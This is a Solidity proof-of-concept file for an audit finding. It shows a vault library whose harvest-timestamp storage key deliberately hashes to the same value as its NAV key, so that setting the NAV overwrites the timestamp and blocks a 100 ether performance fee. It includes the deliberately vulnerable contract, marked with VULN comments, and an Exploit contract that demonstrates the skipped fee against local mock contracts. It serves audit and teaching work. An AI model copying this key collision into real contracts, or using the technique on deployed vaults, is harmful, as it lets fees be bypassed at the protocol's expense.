// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Harmonix VaultStore — LAST_HARVEST_PERFORMANCE_FEE_TIME hashes to
    the same key as NAV (Shieldify, C-03, finding 57885).
    SYNTHETIC, cheatcode-free. One transaction, no warp.

    setVaultState writes the harvest timestamp and then the NAV.
    Both constants are keccak256(abi.encode("NAV")), so the second
    store replaces the timestamp with the NAV. The NAV used here is
    1_000_000 ether, which is far above block.timestamp, so
    harvestPerformanceFee reverts and the 100 ether fee is skipped.
    The fixed constant is a distinct hash. The timestamp stays 0,
    which is already due, and the harvest pays the 100 ether. */

contract FeeToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

library VaultStore {
    bytes32 internal constant NAV = keccak256(abi.encode("NAV"));
    // @> VULN: this is keccak256(abi.encode("NAV")), the same constant as NAV.
    bytes32 internal constant LAST_HARVEST_PERFORMANCE_FEE_TIME = keccak256(abi.encode("NAV"));
    bytes32 internal constant LAST_HARVEST_FIXED = keccak256(abi.encode("LAST_HARVEST_PERFORMANCE_FEE_TIME"));
}

contract Fund {
    FeeToken public token;
    address public dao;
    mapping(bytes32 => uint256) public store;
    uint256 public feesCollected;
    uint256 public constant FEE = 100 ether;
    uint256 public constant INTERVAL = 1;
    uint256 public constant NAV_VALUE = 1_000_000 ether;
    bool public distinctKey;
    bytes32 public constant FUND_KEY = keccak256("FUND");

    constructor(FeeToken token_, address dao_, bool distinctKey_) {
        token = token_;
        dao = dao_;
        distinctKey = distinctKey_;
    }

    function _timeKey() public view returns (bytes32) {
        bytes32 id = distinctKey ? VaultStore.LAST_HARVEST_FIXED : VaultStore.LAST_HARVEST_PERFORMANCE_FEE_TIME;
        return keccak256(abi.encode(FUND_KEY, id));
    }

    function _navKey() public view returns (bytes32) {
        return keccak256(abi.encode(FUND_KEY, VaultStore.NAV));
    }

    function setVaultState(uint256 nav, uint256 lastHarvest) external {
        store[_timeKey()] = lastHarvest;
        // @> VULN: the NAV key equals the harvest-time key, so this write replaces the timestamp.
        store[_navKey()] = nav;
    }

    function harvestPerformanceFee() external returns (uint256 paid) {
        uint256 lastHarvest = store[_timeKey()];
        require(block.timestamp >= lastHarvest + INTERVAL, "HARVEST_TOO_SOON");
        paid = FEE;
        feesCollected = paid;
        require(token.transfer(dao, paid), "fee");
    }
}

contract Exploit {
    FeeToken public token; // nonce 1
    Fund public fund; // nonce 2

    uint256 public slotAfter;
    bool public harvestReverted;
    uint256 public skipped;

    constructor() {
        token = new FeeToken();
        fund = new Fund(token, address(this), false);
        token.mint(address(fund), 100 ether);
    }

    function run() external {
        require(fund._timeKey() == fund._navKey(), "keys collide");
        fund.setVaultState(fund.NAV_VALUE(), 0);
        slotAfter = fund.store(fund._timeKey());
        require(slotAfter == fund.NAV_VALUE(), "timestamp slot now holds the NAV");
        require(slotAfter > block.timestamp, "NAV is not a past timestamp");
        (bool ok,) = address(fund).call(abi.encodeWithSelector(fund.harvestPerformanceFee.selector));
        harvestReverted = !ok;
        skipped = harvestReverted ? fund.FEE() : 0;
        require(harvestReverted, "harvest reverts");
        require(fund.feesCollected() == 0, "no fee collected");
        require(token.balanceOf(address(fund)) == fund.FEE(), "100 fee tokens were skipped");
        require(skipped == 100 ether, "skipped amount is 100");
    }
}
